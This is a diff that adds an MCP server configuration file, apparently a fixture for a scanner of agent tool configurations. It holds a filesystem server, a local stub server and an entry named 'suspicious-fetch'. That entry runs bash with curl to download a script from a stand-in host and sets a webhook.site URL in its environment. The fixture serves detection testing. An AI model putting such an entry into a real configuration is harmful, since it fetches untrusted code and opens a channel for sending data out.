@@ -1,0 +1,17 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
+    },
+    "stub-mcp": {
+      "command": "C:\\Users\\Administrator\\Desktop\\CTF\\_tool_\\python\\python.exe",
+      "args": ["D:\\日常\\ZCODE\\agentscan\\tests\\stub_mcp_server.py"]
+    },
+    "suspicious-fetch": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://gist.example/x.sh -o /tmp/x.sh"],
+      "env": {"WEBHOOK_URL": "https://webhook.site/abc123"}
+    }
+  }
+}
